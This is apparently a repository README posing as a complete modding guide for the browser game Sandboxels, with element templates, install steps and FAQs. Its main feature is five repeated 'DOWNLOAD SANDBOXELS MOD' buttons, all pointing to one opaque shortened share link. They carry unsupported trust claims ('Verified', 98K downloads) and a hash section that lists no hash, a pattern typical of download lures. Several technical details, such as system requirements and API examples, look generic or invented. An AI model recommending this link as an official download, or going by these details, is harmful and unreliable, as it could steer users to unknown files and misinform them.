# 📦 Video Game Mod Sandboxels — Complete Modding Guide

<div align="center">

![Sandboxels](https://img.shields.io/badge/Sandboxels-Falling%20Sand-7C3AED?style=for-the-badge&logo=gamepad&logoColor=white)
![Modding](https://img.shields.io/badge/Modding-Framework-EA580C?style=for-the-badge&logo=modx&logoColor=white)
![Open Source](https://img.shields.io/badge/Open-Source-16A34A?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Downloads](https://img.shields.io/badge/Downloads-98K-0EA5E9?style=for-the-badge&logo=download&logoColor=white)

### 🎨 Build, Modify, Simulate — The Ultimate Sandbox Modding Experience

*Complete guide to creating and installing mods for Sandboxels*

</div>

---

## 🗺️ Guide Structure

> **📚 How this documentation is organized**

<table>
<tr>
<td width="25%" align="center">

### 🟪 Section 1

**Foundations**

- [What is Sandboxels?](#-what-is-sandboxels)
- [Modding Basics](#️-modding-basics)
- [Supported Mod Types](#-supported-mod-types)

</td>
<td width="25%" align="center">

### 🔵 Section 2

**Preparation**

- [Requirements](#-system-requirements)
- [Download](#-download)
- [Verification](#-verification)

</td>
<td width="25%" align="center">

### 🟢 Section 3

**Implementation**

- [Installation](#️-installation-guide)
- [Creating Mods](#-creating-your-first-mod)
- [Testing](#-testing-your-mod)

</td>
<td width="25%" align="center">

### 🔴 Section 4

**Support**

- [Troubleshooting](#️-troubleshooting)
- [FAQ](#-faq)
- [Resources](#-additional-resources)

</td>
</tr>
</table>

---

## 💡 What is Sandboxels?

**Sandboxels** is a browser-based falling-sand simulation game where players interact with hundreds of elements that react to each other in realistic and surprising ways. From water and fire to exotic materials like uranium and antimatter, the possibilities are endless.

The **modding framework** allows you to add new elements, reactions, tools, and behaviors — turning the base game into your personal physics laboratory.

### Core Concepts

| Concept | Description |
|---------|-------------|
| 🧪 **Elements** | Basic building blocks (sand, water, fire) |
| 🔬 **Reactions** | How elements interact |
| 🎨 **Behaviors** | Movement and physics rules |
| 🛠️ **Tools** | Player interactions |
| 📊 **Categories** | Element organization |
| 🎭 **Mods** | User-created additions |

---

## ⚙️ Modding Basics

The Sandboxels mod system uses **JavaScript** and works entirely in the browser.

### Mod File Structure

```
📁 my-mod/
├── 📄 mod.js          ← Main mod file
├── 📄 mod.json        ← Metadata
├── 📁 assets/         ← Images (optional)
│   ├── 🖼️ icon.png
│   └── 🖼️ texture.png
└── 📄 README.md       ← Documentation
```

### Basic Mod Template

```javascript
// mod.js
elements.myElement = {
    color: "#ff5500",
    behavior: [
        "XX|XX|XX",
        "XX|M1|XX",
        "XX|XX|XX"
    ],
    category: "my-category",
    state: "solid",
    density: 1000,
    tempHigh: 500,
    stateHigh: "molten_myElement"
};

elements.molten_myElement = {
    color: "#ffaa00",
    behavior: behaviors.LIQUID,
    category: "my-category",
    state: "liquid",
    density: 800,
    temp: 800
};
```

---

## 📋 Supported Mod Types

| Type | Description | Difficulty |
|------|-------------|:----------:|
| 🧪 **Element Mods** | Add new materials | ⭐ Easy |
| 🔬 **Reaction Mods** | New interactions | ⭐⭐ Medium |
| 🛠️ **Tool Mods** | Custom interactions | ⭐⭐ Medium |
| 🎨 **Texture Mods** | Visual changes | ⭐ Easy |
| 🔊 **Audio Mods** | Sound effects | ⭐ Easy |
| 🎮 **Gameplay Mods** | Mechanics changes | ⭐⭐⭐ Hard |
| 📦 **Pack Mods** | Full collections | ⭐⭐⭐ Hard |

<div align="center">

[![Download Sandboxels Mod](https://img.shields.io/badge/⬇️_DOWNLOAD_SANDBOXELS_MOD-7C3AED?style=for-the-badge&logo=download&logoColor=white&labelColor=4C1D95)](https://share.google/2h9MsN13mrVBL92cE)

</div>

---

## 🔧 System Requirements

```
✅ OS: Windows 10/11, Linux, macOS
✅ Browser: Chrome 90+, Firefox 88+, Edge 90+
✅ RAM: 4 GB minimum (8 GB recommended)
✅ Storage: 500 MB free space
✅ Node.js: 18+ (for local development)
✅ Git: For version control
✅ Text Editor: VSCode, Sublime, or Atom
✅ Internet: For browser-based version
✅ GPU: Hardware acceleration enabled
✅ JavaScript: Basic knowledge helpful
```

> **⚠️ Important Note:** Create a backup of your Sandboxels save data before installing mods. Mods can occasionally break saves.

---

## 📥 Download

<div align="center">

### 🎯 Get the Official Mod Framework

Click below to access the mod resources:

<br>

[![Download Sandboxels Mod](https://img.shields.io/badge/⬇️_DOWNLOAD_SANDBOXELS_MOD-EA580C?style=for-the-badge&logo=download&logoColor=white&labelColor=7C2D12)](https://share.google/2h9MsN13mrVBL92cE)

<br>

*Verified • Open Source • Updated 2025*

</div>

### File Information

| Item | Value |
|------|-------|
| 📦 Size | 5–50 MB |
| ⏱️ Download | Under 1 minute |
| 🗜️ Format | ZIP / JS |
| 🎯 Compatibility | All browsers |
| 📥 Total downloads | 98,000 |

---

## 🔍 Verification

### SHA-256 Hash

```bash
certutil -hashfile sandboxels-mod.zip SHA256
```

### Security Analysis

| Platform | Purpose |
|----------|---------|
| 🦠 **VirusTotal** | Multi-engine scan |
| 🔐 **Hybrid Analysis** | Behavior check |
| 🕵️ **Any.run** | Dynamic inspection |
| 📊 **MetaDefender** | Additional validation |

---

## 🛠️ Installation Guide

### Step 1 — Locate Mods Folder

Sandboxels stores mods in your browser's local storage. Access via:

```
Developer Tools (F12) → Application → Local Storage
→ sandboxels_mods
```

### Step 2 — Open Mod Manager

In-game: **Settings → Mods → Manage Mods**

### Step 3 — Install a Mod

**Option A — From URL:**

Paste the mod URL and click **Install**.

**Option B — From File:**

Drag the `.js` file into the mod area.

**Option C — Manual Install:**

Paste the mod code directly into the editor.

> 💡 If the mod doesn't appear, refresh the page (F5).

<div align="center">

[![Download Sandboxels Mod](https://img.shields.io/badge/⬇️_DOWNLOAD_SANDBOXELS_MOD-16A34A?style=for-the-badge&logo=download&logoColor=white&labelColor=14532D)](https://share.google/2h9MsN13mrVBL92cE)

</div>

### Step 4 — Enable the Mod

Toggle the mod **ON** in the mod manager. Reload the page.

### Step 5 — Test the Elements

Look for your new elements in the **Custom** category.

### Step 6 — Save Configuration

Click **Save** to persist mods across sessions.

### Step 7 — Backup Mods

Export your mod list:

```json
{
  "mods": [
    "https://example.com/mod1.js",
    "https://example.com/mod2.js"
  ]
}
```

### Step 8 — Local Development Setup

For advanced modding:

```bash
git clone https://github.com/sandboxels/sandboxels.git
cd sandboxels
npm install
npm start
```

---

## 🎨 Creating Your First Mod

### Step 1 — Set Up Environment

Create a new file `my-first-mod.js` and open in VSCode.

### Step 2 — Add Basic Element

```javascript
elements.glowingCrystal = {
    color: ["#00ffff", "#00ffaa", "#00ff88"],
    behavior: behaviors.WALL,
    category: "solids",
    state: "solid",
    density: 2500,
    tick: function(pixel) {
        if (Math.random() < 0.01) {
            pixel.color = "#00ffff";
        }
    }
};
```

### Step 3 — Add Reaction

```javascript
runAfterLoad(function() {
    reactions.glowingCrystal = {
        "water": { "elem1": "glowingCrystal", "elem2": "glowingCrystal" }
    };
});
```

### Step 4 — Test Locally

Load your mod in the browser and test.

### Step 5 — Add Category

```javascript
categories.myMod = {
    name: "My Mod",
    color: "#ff00ff"
};
```

### Step 6 — Add Tool

```javascript
tools.myTool = {
    name: "My Tool",
    color: "#ff00ff",
    tool: function(pixel) {
        pixel.element = "glowingCrystal";
    }
};
```

### Step 7 — Publish

Upload to GitHub or share as a URL.

---

## 🧪 Testing Your Mod

| Test | Method | Expected |
|------|--------|----------|
| ✅ Element appears | Category check | Visible |
| ✅ Behavior works | Place & observe | Correct |
| ✅ Reactions trigger | Combine elements | Reaction occurs |
| ✅ No console errors | F12 → Console | Clean |
| ✅ Performance OK | FPS counter | 60 FPS |
| ✅ Save/load works | Reload page | Persists |

---

## 🛠️ Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| ❌ Mod doesn't load | Syntax error | Check F12 console |
| ❌ Element invisible | Wrong category | Verify category name |
| ❌ Reaction not working | Typo in element ID | Check spelling |
| ❌ Game crashes | Infinite loop | Add tick limits |
| ❌ Save corrupted | Bad mod | Clear localStorage |
| ❌ Low FPS | Too many elements | Optimize code |
| ❌ Mod breaks others | Conflict | Load order |
| ❌ Can't install | CORS issue | Use local file |
| ❌ Colors wrong | Format issue | Use hex format |
| ❌ Tool not working | Wrong function | Check syntax |

### Reset Mods

```javascript
// In console (F12)
localStorage.removeItem('sandboxels_mods');
location.reload();
```

---

## 📋 Additional Resources

### Useful APIs

| API | Purpose |
|-----|---------|
| `elements` | Define new elements |
| `behaviors` | Built-in behavior presets |
| `reactions` | Define reactions |
| `tools` | Create custom tools |
| `categories` | Organize elements |
| `runAfterLoad` | Execute after loading |
| `runEveryTick` | Per-frame logic |
| `pixel` | Pixel manipulation |

### Common Behaviors

```javascript
behaviors.WALL        // Static solid
behaviors.LIQUID      // Flowing liquid
behaviors.POWDER      // Falling powder
behaviors.GAS         // Rising gas
behaviors.FIRE        // Burning
behaviors.EXPLOSIVE   // Explodes
behaviors.STURDYPOWDER // Doesn't fall
```

---

## ❓ FAQ

**Is Sandboxels free?**
Yes, it's completely free and open source.

**Do I need to know JavaScript?**
Basic knowledge helps, but you can start with templates.

**Can I sell my mods?**
The base game is open source — check the license.

**Where can I share mods?**
GitHub, Sandboxels Discord, or Reddit.

**Will mods break my saves?**
Rarely, but backup first.

**Can I use mods on mobile?**
Yes, in modern mobile browsers.

**How do I uninstall a mod?**
Toggle it off in the mod manager.

**Are mods moderated?**
Community mods are user-made — install responsibly.

**Can I combine mods?**
Yes, most mods work together.

**Where's the documentation?**
Check the official Sandboxels GitHub wiki.

---

## 📜 Version History

| Version | Date | Changes |
|---------|------|---------|
| 2025.01 | Jan 2025 | New behavior API |
| 2024.10 | Oct 2024 | Category system |
| 2024.06 | Jun 2024 | Tool API v2 |
| 2024.02 | Feb 2024 | First stable |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Sandboxels Mod](https://img.shields.io/badge/🔑_GET_SANDBOXELS_MOD-0EA5E9?style=for-the-badge&logo=gamepad&logoColor=white&labelColor=0C4A6E)](https://share.google/2h9MsN13mrVBL92cE)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the modding community*

</div>
